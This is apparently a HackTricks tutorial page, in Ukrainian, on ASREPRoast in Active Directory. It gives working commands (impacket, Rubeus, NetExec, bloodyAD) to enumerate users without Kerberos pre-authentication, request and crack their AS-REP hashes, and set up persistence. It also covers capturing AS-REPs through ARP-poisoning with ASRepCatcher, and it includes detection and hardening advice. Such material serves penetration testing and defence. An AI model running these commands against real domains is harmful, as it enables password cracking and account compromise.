# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

## ASREPRoast

ASREPRoast — це атака на безпеку, яка використовує облікові записи користувачів, для яких не встановлено атрибут **обов’язкової попередньої автентифікації Kerberos**. По суті, ця вразливість дає змогу зловмисникам запитувати автентифікацію користувача в контролера домену (DC), не знаючи пароля користувача. У відповідь DC надсилає повідомлення, зашифроване ключем, похідним від пароля користувача. Зловмисники можуть спробувати зламати його офлайн, щоб дізнатися пароль користувача.

Основні вимоги для цієї атаки:

- **Відсутність попередньої автентифікації Kerberos**: для цільових користувачів цю функцію безпеки не має бути ввімкнено.
- **Підключення до контролера домену (DC)**: зловмисникам потрібен доступ до DC, щоб надсилати запити й отримувати зашифровані повідомлення.
- **Обліковий запис домену (необов’язково)**: наявність облікового запису домену дає змогу зловмисникам ефективніше знаходити вразливих користувачів за допомогою LDAP-запитів. Без такого облікового запису зловмисникам доведеться вгадувати імена користувачів.

#### Перелік вразливих користувачів (потрібні облікові дані домену)

```bash:Using Windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```

#### Запит AS_REP message

```bash:Using Linux
# Installed package entrypoint (same logic as GetNPUsers.py)
impacket-GetNPUsers -no-pass -usersfile usernames.txt -dc-ip <dc_ip> <domain>/ -format hashcat -outputfile hashes.asreproast
# Use domain creds to LDAP-enumerate roastable users and request them
impacket-GetNPUsers <domain>/<user>:<pass> -request -format hashcat -outputfile hashes.asreproast
# If you are running directly from the examples/ directory
python GetNPUsers.py -no-pass <domain>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
```

```bash:Using Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username] [/aes]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```

> [!WARNING]
> Rubeus за замовчуванням надсилає запити з **RC4**, тому в Event ID **4768** зазвичай відображаються **preauth type 0** і **ticket encryption type 0x17**. Якщо додати **`/aes`** (або для цільового облікового запису вимкнено RC4), очікуйте **AES etypes**.<sup>[[2]](#references)</sup>

#### Короткі однорядкові команди (Linux)

- Спочатку перелічи потенційні цілі (наприклад, із leaked build paths) за допомогою Kerberos userenum: `kerbrute userenum users.txt -d domain --dc dc.domain`
- Зроби roast для всього списку імен користувачів без дійсних облікових даних за допомогою NetExec: `netexec ldap <dc> -u users.txt -p '' --asreproast out.asreproast`<sup>[[3]](#references)[[4]](#references)</sup>
- Якщо маєш облікові дані, дозволь NetExec опитати LDAP і запросити всі облікові записи, які можна roast-ити: `netexec ldap <dc> -u <user> -p '<pass>' --asreproast out.asreproast [--kdcHost <dc_fqdn>]`<sup>[[3]](#references)</sup>
- Якщо вивід починається з **`$krb5asrep$23$`**, зламай його за допомогою Hashcat **`-m 18200`**. Якщо він починається з **`$krb5asrep$17$`** або **`$krb5asrep$18$`**, краще скористайся John із параметром **`--format=krb5asrep`**.<sup>[[1]](#references)[[2]](#references)</sup>

### Зламування

Не вважай, що кожен AS-REP roast використовує RC4. Сучасні інструменти можуть повертати **RC4** (`$krb5asrep$23$`) або **AES** (`$krb5asrep$17$` / `$krb5asrep$18$`) залежно від запитаного/узгодженого enctype. **`hashcat -m 18200`** призначений для **etype 23**, тоді як **John** безпосередньо обробляє `krb5asrep` для **17/18/23**.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
john --format=krb5asrep --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 -a 0 hashes.asreproast passwords_kerb.txt # RC4 / etype 23
```

### Закріплення

Вимкніть вимогу **preauth** для користувача, щодо якого маєте дозвіл **GenericAll** (або дозвіл на запис властивостей):

```bash:Using Windows
# Toggle DONT_REQ_PREAUTH on (run it again to toggle it back off during cleanup)
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

```bash:Using Linux
# Enable ASREPRoastability
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH 'target_user'
# Cleanup
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 remove uac -f DONT_REQ_PREAUTH 'target_user'
```

### Виявлення та посилення захисту

Успішний **AS-REP-запит без попередньої автентифікації** створює на DC подію **4768** зі значеннями `Status=0x0` і `PreAuthType=0`; вона фіксує запит, а не доводить, що хтось зламав відповідь або скомпрометував обліковий запис. Не вимагайте RC4 для виявлення: `TicketEncryptionType=0x17` — корисна ознака слабкого шифрування, але зловмисник може запросити AES (значення в журналі подій `0x11`/`0x12`). У Windows Server 2016 і новіших версіях із сукупним оновленням від 14 січня 2025 року (або новішим) версія 2 події 4768 також містить `ClientAdvertizedEncryptionTypes`, типи шифрування, які підтримують обліковий запис/DC, і доступні ключі.<sup>[[5]](#references)</sup>

Практичний пошук позначає клієнта, який оголошує лише RC4, хоча обліковий запис має ключі AES, а потім зіставляє сплески запитів з однієї IP-адреси до кількох користувачів без попередньої автентифікації. Задайте базові очікувані винятки замість того, щоб сповіщати про кожну подію `PreAuthType=0`.

Для атрибуції нормалізуйте поле `IpAddress` (воно може містити IPv4-адресу у форматі з відображенням `::ffff:`) і зіставте часовий інтервал із подіями квитків служби 4769 або доступу до спільних ресурсів 5140. У цих подіях можуть бути вказані облікові записи, активні з тієї самої адреси, але для AS-REP-запиту без попередньої автентифікації не потрібен автентифікований обліковий запис. Спільні хости, NAT, проксі та кілька сеансів означають, що збіг IP-адрес **не** встановлює особу чи обліковий запис, з якого надіслали AS-REQ. Розглядайте пов’язані облікові записи як зачіпки для розслідування та підтверджуйте їх даними з кінцевих пристроїв або мережі.<sup>[[5]](#references)[[7]](#references)[[8]](#references)</sup>

Надійне виправлення — зняти прапорець **Не вимагати попередньої автентифікації Kerberos** для кожного користувача, якому це не конче потрібно, і змінити паролі облікових записів, які могли бути розкриті. Якщо виняток неможливо усунути, використовуйте довгий випадково згенерований пароль і надайте мінімальні привілеї. Вимкнення RC4 підвищує вартість злому, але не усуває можливість офлайн-злому, оскільки відповіді AES AS-REP теж можна зламати офлайн.<sup>[[2]](#references)[[5]](#references)</sup>

## ASREProast без облікових даних

Зловмисник, який перебуває на шляху трафіку, може перехопити AS-REP, повернений під час звичайного обміну AS із попередньою автентифікацією, і підготувати його зашифровану частину для офлайн-злому. На відміну від класичного ASREPRoasting, для цього не потрібен `DONT_REQ_PREAUTH`; однак це дає змогу отримати лише ті облікові записи, обмін Kerberos яких фактично перехоплено. **ASRepCatcher** за замовчуванням займає потрібну позицію за допомогою односпрямованого ARP poisoning або може приймати трафік від іншої техніки MitM із параметром `--disable-spoofing`.<sup>[[6]](#references)</sup>\
Якщо вас цікавить пов’язаний трюк без облікових даних, який повертає **квиток служби** замість **TGT** від принципала без попередньої автентифікації, див. [Kerberoast](kerberoast.md).

У режимі `relay` [ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) пересилає перехоплені AS-REQ і примусово використовує **RC4**, якщо обидві сторони досі його підтримують. Режим `listen` не змінює пакети й тому перехоплює той тип шифрування, про який домовилися клієнт і DC. За можливості обмежуйте область ARP poisoning параметрами `-t`/`-tf`, а не охоплюйте всю підмережу.<sup>[[6]](#references)</sup>

```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen

# Scope targets and save directly in Hashcat format
ASRepCatcher relay -dc $DC_IP -t 192.168.1.0/24 -outfile hashes.asreproast -format hashcat
```

---

---

## References

- [1] [AS-REP Roasting – ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
- [2] [Roasting AES AS-REPs – MWR CyberSec](https://mwrcybersec.com/roasting-aes-as-reps)
- [3] [NetExec Wiki – ASREPRoast](https://www.netexec.wiki/ldap-protocol/asreproast)
- [4] [0xdf – HTB Bruno (AS-REP roast → ZipSlip → DLL hijack)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [5] [Microsoft – Подія 4768: запитано квиток автентифікації Kerberos](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768)
- [6] [Yaxxine7 – ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher)
- [7] [Microsoft – Подія безпеки 4769](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4769)
- [8] [Microsoft – Подія безпеки 5140](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-5140)
{{#include ../../banners/hacktricks-training.md}}
